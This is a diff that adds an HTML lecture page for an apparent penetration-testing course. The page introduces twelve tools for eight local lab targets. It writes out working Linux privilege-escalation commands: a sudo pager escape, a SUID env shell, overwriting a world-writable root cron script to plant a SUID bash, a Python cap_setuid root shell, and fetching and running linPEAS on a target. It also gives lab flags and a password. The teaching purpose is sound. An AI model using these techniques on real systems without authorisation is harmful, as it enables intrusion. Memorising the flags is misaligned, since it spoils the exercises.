@@ -1,0 +1,458 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Atlas Class 00 — Operator Foundations">
+  <title>Atlas — Operator Foundations</title>
+  <link rel="stylesheet" href="/static/styles.css">
+  <link rel="stylesheet" href="/static/class.css">
+  <script src="/static/class.js" defer></script>
+</head>
+<body>
+  <main class="site-shell">
+    <div class="noise" aria-hidden="true"></div>
+    <header class="topbar">
+      <button class="brand" data-view-target="mission" aria-label="Atlas home">
+        <span class="brand-mark"><i></i><i></i><i></i></span>
+        <span><strong>ATLAS</strong><small>VULNSEC ACADEMY</small></span>
+      </button>
+      <div class="topbar-center"><span>CLASS 00</span><b>OPERATOR FOUNDATIONS</b></div>
+      <div class="environment-pill"><span class="pulse-dot"></span><span><small>ENVIRONMENT</small><strong id="environment-status">CONNECTING</strong></span></div>
+    </header>
+
+    <div class="workspace">
+      <aside class="rail" aria-label="Class navigation">
+        <div class="rail-label">LECTURE</div>
+        <nav>
+          <button class="active" data-view-target="mission"><span>01</span><i></i><em>Briefing</em></button>
+          <button data-view-target="toolkit"><span>02</span><i></i><em>Toolkit</em></button>
+          <button data-view-target="range"><span>03</span><i></i><em>Range</em></button>
+        </nav>
+        <div class="rail-progress">
+          <div><span>MODE</span><b>CLASS</b></div>
+          <div class="progress-track"><i style="width:100%"></i></div>
+          <small>No target · lecture only</small>
+        </div>
+      </aside>
+
+      <section class="content">
+        <section class="view-enter" data-view="mission">
+          <section class="mission-hero">
+            <div class="hero-copy">
+              <div class="kicker"><span>CLASS 00</span><i></i> BEFORE THE RANGE</div>
+              <h1>OPERATOR<br><em>CLASS</em></h1>
+              <p>This is not a lab. There is no host to hack. Read every tool: what it is for, how you invoke it, and what a clean run looks like. Then you walk the eight labs in order — recon first, privilege escalation second.</p>
+              <div class="hero-actions">
+                <button class="primary-button" data-view-target="toolkit">Open the toolkit <span>→</span></button>
+                <span class="time-chip">◷ &nbsp; 40–60 MIN READ</span>
+              </div>
+            </div>
+            <div class="radar-card" aria-label="Class before range">
+              <div class="radar-grid"></div>
+              <div class="radar-ring ring-one"></div>
+              <div class="radar-ring ring-two"></div>
+              <div class="radar-ring ring-three"></div>
+              <div class="radar-sweep"></div>
+              <div class="node kali-node"><i></i>KALI<small>CLASSROOM</small></div>
+              <div class="node target-node"><i></i>RANGE<small>EIGHT LABS NEXT</small></div>
+              <div class="radar-caption"><span>NO TARGET</span><b>LECTURE MODE</b></div>
+            </div>
+          </section>
+
+          <section class="mission-grid">
+            <article class="brief-card coordinates-card">
+              <div class="card-number">01</div>
+              <p class="section-label">HOW THIS WORKS</p>
+              <div class="coordinate-row"><span>THIS PACKAGE</span><code>class only</code></div>
+              <div class="coordinate-row"><span>ATLAS</span><code>127.0.0.1:8888</code></div>
+              <div class="coordinate-row"><span>AFTER CLASS</span><code>First Sweep</code></div>
+              <div class="scope-warning"><b>!</b><span>Do not skip to linPEAS. The noisy tool is last for a reason.</span></div>
+            </article>
+            <article class="brief-card objectives-card">
+              <div class="card-number">02</div>
+              <p class="section-label">YOU WILL LEARN</p>
+              <ol>
+                <li><span>01</span>Scan a host and read nmap</li>
+                <li><span>02</span>Fuzz web paths and backup files</li>
+                <li><span>03</span>Escalate with sudo, cron, SUID, caps</li>
+                <li><span>04</span>Move tools onto a box and read linPEAS</li>
+              </ol>
+            </article>
+            <article class="brief-card loadout-card">
+              <div class="card-number">03</div>
+              <p class="section-label">JUMP TO A TOOL</p>
+              <div class="tool-row"><span class="tool-icon">N</span><span><b>Nmap</b><small>Recon</small></span><button class="ghost-button" data-jump="tool-nmap" type="button">Open</button></div>
+              <div class="tool-row"><span class="tool-icon">G</span><span><b>Gobuster</b><small>Web fuzz</small></span><button class="ghost-button" data-jump="tool-gobuster" type="button">Open</button></div>
+              <div class="tool-row"><span class="tool-icon">L</span><span><b>linPEAS</b><small>Last, not first</small></span><button class="ghost-button" data-jump="tool-linpeas" type="button">Open</button></div>
+            </article>
+          </section>
+        </section>
+
+        <section class="view-enter is-hidden" data-view="toolkit">
+          <div class="view-heading">
+            <div>
+              <p class="section-label">OPERATOR TOOLKIT</p>
+              <h2>Purpose. Command. Output.</h2>
+            </div>
+            <span>12 TOOLS</span>
+          </div>
+          <div class="tool-jump">
+            <button type="button" data-jump="tool-nmap">Nmap</button>
+            <button type="button" data-jump="tool-curl">curl</button>
+            <button type="button" data-jump="tool-gobuster">Gobuster</button>
+            <button type="button" data-jump="tool-ffuf">ffuf</button>
+            <button type="button" data-jump="tool-ssh">SSH</button>
+            <button type="button" data-jump="tool-sudo">sudo -l</button>
+            <button type="button" data-jump="tool-gtfo">GTFOBins</button>
+            <button type="button" data-jump="tool-find">find SUID</button>
+            <button type="button" data-jump="tool-cron">cron</button>
+            <button type="button" data-jump="tool-transfer">http.server</button>
+            <button type="button" data-jump="tool-linpeas">linPEAS</button>
+            <button type="button" data-jump="tool-getcap">getcap</button>
+          </div>
+
+          <article class="tool-card" id="tool-nmap">
+            <div class="tool-kicker"><span>01 · RECON</span><code>nmap</code></div>
+            <h3>Nmap</h3>
+            <p>Network mapper. You give it an address; it tells you which TCP (and UDP) ports are open and what is listening. You scan <em>before</em> you browse. Default nmap is the top 1000 ports, not every port. <code>-sV</code> fills the version column. <code>-p-</code> is every TCP port — cheap on one authorised host, not on a range.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>-sV</code><span>Service and version detection</span></div>
+                <div><code>-Pn</code><span>Skip ping; treat the host as up</span></div>
+                <div><code>-p-</code><span>All 65535 TCP ports</span></div>
+                <div><code>-p80</code><span>One port only — a test, not a sweep</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — nmap</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> nmap -sV 10.23.54.12</div>
+                  <div class="terminal-output">
+                    <div class="muted">PORT   STATE SERVICE VERSION</div>
+                    <div class="hot">22/tcp open  ssh     OpenSSH</div>
+                    <div class="hot">80/tcp open  http    NorthlineLodge 1.2</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Count only rows that say open. Closed 80 is a finding, not a dead host — that is Odd Berth.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>First Sweep</b> · <b>Odd Berth</b></p>
+          </article>
+
+          <article class="tool-card" id="tool-curl">
+            <div class="tool-kicker"><span>02 · RECON</span><code>curl</code></div>
+            <h3>curl</h3>
+            <p>Fetch a URL from the terminal. Faster than a browser when you only need the body, a header, or a grep. <code>wget</code> does the same job for downloads. If the service is not on port 80, the URL must include the port.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>-s</code><span>Silent — no progress meter</span></div>
+                <div><code>-I</code><span>Headers only</span></div>
+                <div><code>-o file</code><span>Write to a file (tool transfer)</span></div>
+                <div><code>:8088</code><span>Required when HTTP is not on 80</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — curl</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> curl -s http://10.23.54.19:8088/ | grep -i identifier</div>
+                  <div class="terminal-output"><div class="flag">Berth identifier BC-1908</div></div>
+                </div>
+                <figcaption><i>i</i>Browsers default to port 80. curl does not guess. Put the port in the URL.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>every web lab</b> · <b>Loud Enumerator</b> (pull tools)</p>
+          </article>
+
+          <article class="tool-card" id="tool-gobuster">
+            <div class="tool-kicker"><span>03 · WEB FUZZ</span><code>gobuster dir</code></div>
+            <h3>Gobuster</h3>
+            <p>Directory and file brute-force. The public nav is not the site. You point gobuster at a URL and a wordlist; it reports status codes. 200 is live. 404 is noise. 301/302 is a redirect worth following. <code>robots.txt</code> is a hint file, not an inventory — Disallow does not mean the path exists.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>dir</code><span>Directory/file mode</span></div>
+                <div><code>-u</code><span>Base URL</span></div>
+                <div><code>-w</code><span>Wordlist (dirb/common.txt is enough here)</span></div>
+                <div><code>-x</code><span>Extensions: bak,old,txt — files, not folders</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — gobuster</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> gobuster dir -u http://10.23.54.31 -w /usr/share/wordlists/dirb/common.txt</div>
+                  <div class="terminal-output">
+                    <div>/contact          (Status: 200)</div>
+                    <div class="hot">/internal         (Status: 200)</div>
+                    <div class="muted">/backup           (Status: 404)</div>
+                  </div>
+                  <div class="command-line"><b>└─$</b> gobuster dir -u http://10.23.54.38/archive -w /usr/share/wordlists/dirb/common.txt -x bak,old,txt</div>
+                  <div class="terminal-output"><div class="hot">/notes.bak        (Status: 200)</div></div>
+                </div>
+                <figcaption><i>i</i>First fuzz finds folders. Second fuzz, with -x, finds backup files inside them. That is Nested Hold.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Unlisted Door</b> · <b>Nested Hold</b></p>
+          </article>
+
+          <article class="tool-card" id="tool-ffuf">
+            <div class="tool-kicker"><span>04 · WEB FUZZ</span><code>ffuf</code></div>
+            <h3>ffuf</h3>
+            <p>Same job as gobuster, different syntax. <code>FUZZ</code> is the placeholder the wordlist fills. <code>-e</code> is gobuster’s <code>-x</code>. Use whichever you have; Atlas accepts both in the fuzz labs.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>-u .../FUZZ</code><span>Injection point</span></div>
+                <div><code>-w</code><span>Wordlist</span></div>
+                <div><code>-e .bak,.old,.txt</code><span>Extensions</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — ffuf</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> ffuf -u http://10.23.54.31/FUZZ -w /usr/share/wordlists/dirb/common.txt</div>
+                  <div class="terminal-output"><div class="hot">internal                 [Status: 200]</div></div>
+                </div>
+                <figcaption><i>i</i>dirb, feroxbuster, wfuzz — same idea. Learn one well.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Unlisted Door</b> · <b>Nested Hold</b> (equivalent)</p>
+          </article>
+
+          <article class="tool-card" id="tool-ssh">
+            <div class="tool-kicker"><span>05 · ACCESS</span><code>ssh</code></div>
+            <h3>SSH</h3>
+            <p>Remote shell. In the privesc module the briefing <em>gives</em> you the account. That is not a skip — you still take <code>user.txt</code> before you escalate. Password auth in these labs. Do not confuse the SSH banner with a vulnerability.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>user@host</code><span>Issued operator</span></div>
+                <div><code>user.txt</code><span>Always grab this first</span></div>
+                <div><code>sudo -l</code><span>First command inside, even if it fails</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali — ssh</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>└─$</b> ssh k.vale@10.23.54.201</div>
+                  <div class="terminal-output">
+                    <div class="muted">password: Shelf-201</div>
+                    <div>k.vale@node:~$ cat user.txt</div>
+                    <div class="flag">LPE{borrowed_bin_shelf}</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>HTTP on those nodes is a notice. The work is the shell.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Borrowed Bin</b> · <b>Clockwork</b> · <b>Setuid Tide</b> · <b>Loud Enumerator</b></p>
+          </article>
+
+          <article class="tool-card" id="tool-sudo">
+            <div class="tool-kicker"><span>06 · PRIVESC</span><code>sudo -l</code></div>
+            <h3>sudo -l</h3>
+            <p>Ask what this account may run as root. Do this before you guess binaries or kernels. <code>NOPASSWD</code> means you do not need the user’s password for that command. An empty result is also a finding — then you look at cron and SUID.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>sudo -l</code><span>List allowed commands</span></div>
+                <div><code>NOPASSWD</code><span>No password for that path</span></div>
+                <div><code>(root)</code><span>Runs as root, not as you</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>target — sudo</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> sudo -l</div>
+                  <div class="terminal-output">
+                    <div class="hot">(root) NOPASSWD: /usr/bin/less</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>Then look that binary up on GTFOBins — Sudo function. Do not invent vim because a blog used vim.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Borrowed Bin</b> (hit) · later labs (empty on purpose)</p>
+          </article>
+
+          <article class="tool-card" id="tool-gtfo">
+            <div class="tool-kicker"><span>07 · PRIVESC</span><code>gtfobins.github.io</code></div>
+            <h3>GTFOBins</h3>
+            <p>A catalogue of Unix binaries that can be abused when you can run them in a privileged context. You look up the <em>program</em>, not the filename. Two columns you will use: <b>Sudo</b> (you may run it via sudo) and <b>SUID</b> (the setuid bit is on). They are not interchangeable. <code>less</code> as sudo uses <code>!</code> inside the pager. <code>env</code> as SUID runs <code>/bin/sh -p</code>.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>Sudo</code><span>Borrowed Bin — less + !/bin/sh</span></div>
+                <div><code>SUID</code><span>Setuid Tide — env /bin/sh -p</span></div>
+                <div><code>-p</code><span>Keep euid 0; a login shell may drop it</span></div>
+                <div><code>filename</code><span>May be a lie. --help / file first</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>target — GTFOBins</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> sudo less /etc/hosts</div>
+                  <div class="terminal-output"><div class="muted"># inside less, type:</div><div>!/bin/sh</div></div>
+                  <div class="command-line"><b>$</b> /usr/local/bin/yard-report /bin/sh -p</div>
+                  <div class="terminal-output"><div class="hot">uid=1000 gid=1000 euid=0(root)</div></div>
+                </div>
+                <figcaption><i>i</i>yard-report is a copy of env. Search GTFOBins for env, not for yard-report.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Borrowed Bin</b> · <b>Setuid Tide</b></p>
+          </article>
+
+          <article class="tool-card" id="tool-find">
+            <div class="tool-kicker"><span>08 · PRIVESC</span><code>find -perm -4000</code></div>
+            <h3>find (SUID)</h3>
+            <p>List files that keep the setuid bit. Stock helpers (passwd, sudo, newgrp, mount) are expected. A custom name under <code>/usr/local</code> is not. Identify what that file actually is before you open GTFOBins.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>-perm -4000</code><span>Setuid bit is on</span></div>
+                <div><code>-type f</code><span>Files only</span></div>
+                <div><code>2>/dev/null</code><span>Hide permission denied noise</span></div>
+                <div><code>--help</code><span>Filename is not the program</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>target — find</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> find / -perm -4000 -type f 2>/dev/null</div>
+                  <div class="terminal-output">
+                    <div class="muted">/usr/bin/passwd</div>
+                    <div class="muted">/usr/bin/sudo</div>
+                    <div class="hot">/usr/local/bin/yard-report</div>
+                  </div>
+                  <div class="command-line"><b>$</b> /usr/local/bin/yard-report --help | head</div>
+                  <div class="terminal-output"><div class="hot">Usage: env [OPTION]... [COMMAND [ARG]...]</div></div>
+                </div>
+                <figcaption><i>i</i>That is Setuid Tide. Clockwork uses a different bit: world-writable, not setuid.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Setuid Tide</b></p>
+          </article>
+
+          <article class="tool-card" id="tool-cron">
+            <div class="tool-kicker"><span>09 · PRIVESC</span><code>/etc/cron.d</code></div>
+            <h3>Cron</h3>
+            <p>Root’s clock. If sudo is empty, read scheduled jobs. A script executed as root that <em>you</em> can write is the job. Overwrite it, wait for the minute, take a SUID bash. Reverse shells need a path back to Kali — on an internal Docker net they often die. SUID bash does not need the network. <code>/tmp/rootbash -p</code> keeps root.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>/etc/cron.d</code><span>System jobs, often root</span></div>
+                <div><code>ls -l script</code><span>Look for 777 / world-writable</span></div>
+                <div><code>sleep 60</code><span>The clock is one minute</span></div>
+                <div><code>-p</code><span>SUID bash must not drop euid</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>target — cron</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> cat /etc/cron.d/yard-rotate</div>
+                  <div class="terminal-output"><div class="hot">* * * * * root /bin/bash /usr/local/bin/yard-rotate.sh</div></div>
+                  <div class="command-line"><b>$</b> ls -l /usr/local/bin/yard-rotate.sh</div>
+                  <div class="terminal-output"><div class="hot">-rwxrwxrwx 1 root root yard-rotate.sh</div></div>
+                  <div class="command-line"><b>$</b> printf 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /usr/local/bin/yard-rotate.sh</div>
+                </div>
+                <figcaption><i>i</i>pspy watches processes live. These labs put the job in /etc/cron.d so you can read it cold.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Clockwork</b></p>
+          </article>
+
+          <article class="tool-card" id="tool-transfer">
+            <div class="tool-kicker"><span>10 · TRANSFER</span><code>python3 -m http.server</code></div>
+            <h3>Move tools onto the box</h3>
+            <p>linPEAS is not installed on the target. You fetch it on Kali, serve the folder, and curl it from the target. Bind <code>0.0.0.0</code> or the container cannot reach you. Confirm the gateway with <code>ip route</code> — often <code>10.23.54.1</code>, not always. <code>scp file user@host:/tmp/</code> is the backup if HTTP the other way fails. <code>wget</code> is curl’s twin.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>http.server</code><span>Kali, all interfaces</span></div>
+                <div><code>ip route</code><span>Default via = gateway</span></div>
+                <div><code>curl -o</code><span>Write the script in /tmp</span></div>
+                <div><code>scp</code><span>Same direction as SSH</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>kali + target</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>kali $</b> python3 -m http.server 8000 --bind 0.0.0.0</div>
+                  <div class="command-line"><b>target $</b> curl http://10.23.54.1:8000/linpeas.sh -o /tmp/linpeas.sh</div>
+                  <div class="command-line"><b>target $</b> chmod +x /tmp/linpeas.sh; /tmp/linpeas.sh</div>
+                </div>
+                <figcaption><i>i</i>Binding 127.0.0.1 on Kali is a common fail. The target is not localhost.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Loud Enumerator</b></p>
+          </article>
+
+          <article class="tool-card" id="tool-linpeas">
+            <div class="tool-kicker"><span>11 · ENUM</span><code>linpeas.sh</code></div>
+            <h3>linPEAS</h3>
+            <p>Automated Linux privilege-escalation enumerator (PEASS-ng). It is loud on purpose. Yellow/red is interesting; the whole scroll is not a to-do list. In Loud Enumerator the Capabilities block is the path. Kernel CVEs, linux-exploit-suggester, and a MOTD that claims kernel 4.4.0 are decoys — the container kernel is the <b>host</b> kernel. Do not run Dirty COW or any kernel PoC in these labs.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>linPEAS</code><span>Primary tool in lab 8</span></div>
+                <div><code>linuxprivchecker.py</code><span>Older optional alternative, same transfer</span></div>
+                <div><code>kernel</code><span>Noise here. Never the intended path</span></div>
+                <div><code>colour</code><span>Read it. Do not fire every CVE</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>target — linPEAS</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> /tmp/linpeas.sh | less -R</div>
+                  <div class="terminal-output">
+                    <div class="muted">... sudo: user is not allowed ...</div>
+                    <div class="muted">... Possible kernel exploits (LES) ...</div>
+                    <div class="hot">Files with capabilities</div>
+                    <div class="hot">/usr/local/bin/python3.13 cap_setuid=ep</div>
+                  </div>
+                </div>
+                <figcaption><i>i</i>linuxprivchecker.py: python3 /tmp/linuxprivchecker.py — it will also suggest kernel CVEs. Ignore those here.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Loud Enumerator</b> — last lab, after you can read sudo/cron/SUID by hand</p>
+          </article>
+
+          <article class="tool-card" id="tool-getcap">
+            <div class="tool-kicker"><span>12 · PRIVESC</span><code>getcap</code></div>
+            <h3>getcap</h3>
+            <p>Linux file capabilities. Narrower than full root, still enough. <code>cap_setuid+ep</code> on Python means the process can call <code>os.setuid(0)</code> and then spawn a root shell. linPEAS prints this; you can also ask without linPEAS. Same family of idea as SUID, different bit.</p>
+            <div class="tool-layout">
+              <div class="explain-list">
+                <div><code>getcap -r /</code><span>Walk the filesystem</span></div>
+                <div><code>cap_setuid</code><span>Become uid 0 from userspace</span></div>
+                <div><code>os.setuid(0)</code><span>Python one-liner, then execl sh -p</span></div>
+              </div>
+              <figure class="terminal-shot">
+                <div class="terminal-bar"><span><i></i><i></i><i></i></span><b>target — getcap</b><em>EXAMPLE</em></div>
+                <div class="terminal-body">
+                  <div class="command-line"><b>$</b> getcap -r / 2>/dev/null</div>
+                  <div class="terminal-output"><div class="hot">/usr/local/bin/python3.13 cap_setuid=ep</div></div>
+                  <div class="command-line"><b>$</b> python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh", "-p")'</div>
+                  <div class="terminal-output"><div># cat /root/root.txt</div><div class="flag">LPE{loud_enumerator_root}</div></div>
+                </div>
+                <figcaption><i>i</i>If you already know capabilities exist, you do not need linPEAS. The class still teaches the transfer.</figcaption>
+              </figure>
+            </div>
+            <p class="used-in">USED IN <b>Loud Enumerator</b></p>
+          </article>
+        </section>
+
+        <section class="view-enter is-hidden" data-view="range">
+          <div class="view-heading">
+            <div>
+              <p class="section-label">THE RANGE</p>
+              <h2>Class, then labs in this order.</h2>
+            </div>
+            <span>8 LABS</span>
+          </div>
+          <p class="hero-copy" style="max-width:640px;color:#9da8ae;line-height:1.7">Stop this Atlas (port 8888) before you start a lab. Each lab has its own Atlas with questions and a locked walkthrough. Do not run two packages at once.</p>
+          <div class="range-list">
+            <div class="module-split">MODULE 01 — RECONNAISSANCE</div>
+            <div class="range-row"><span>R1</span><div><b>First Sweep</b><small>nmap -sV. Two ports. Read the lodge identifier.</small></div><code>10.23.54.12</code></div>
+            <div class="range-row"><span>R2</span><div><b>Odd Berth</b><small>HTTP is not on 80. Widen with -p-.</small></div><code>10.23.54.19</code></div>
+            <div class="range-row"><span>F1</span><div><b>Unlisted Door</b><small>gobuster. Hidden /internal/. robots.txt lies.</small></div><code>10.23.54.31</code></div>
+            <div class="range-row"><span>F2</span><div><b>Nested Hold</b><small>Fuzz twice. -x bak,old,txt.</small></div><code>10.23.54.38</code></div>
+            <div class="module-split">MODULE 02 — LINUX PRIVILEGE ESCALATION</div>
+            <div class="range-row"><span>P1</span><div><b>Borrowed Bin</b><small>SSH given. sudo -l → less → GTFOBins Sudo.</small></div><code>10.23.54.201</code></div>
+            <div class="range-row"><span>P2</span><div><b>Clockwork</b><small>No sudo. Writable root cron. Wait one minute.</small></div><code>10.23.54.208</code></div>
+            <div class="range-row"><span>P3</span><div><b>Setuid Tide</b><small>find -perm -4000. Fake name, real env. GTFOBins SUID.</small></div><code>10.23.54.214</code></div>
+            <div class="range-row"><span>P4</span><div><b>Loud Enumerator</b><small>Transfer linPEAS. cap_setuid. Ignore kernel.</small></div><code>10.23.54.221</code></div>
+          </div>
+          <section class="completion-card">
+            <div>
+              <span>CLASS 00</span>
+              <h3>Lecture done. Start First Sweep.</h3>
+              <p>When this Atlas is closed, start Vulnsec-Academy-Recon-Lab-01-First-Sweep. Do not open linPEAS until lab eight.</p>
+            </div>
+            <button class="primary-button" data-view-target="toolkit" type="button">Back to toolkit</button>
+          </section>
+        </section>
+      </section>
+    </div>
+  </main>
+  <div class="portal-error is-hidden" id="portal-error" role="alert"><b>ATLAS OFFLINE</b><span>Start Class 00, then reload this page.</span></div>
+</body>
+</html>
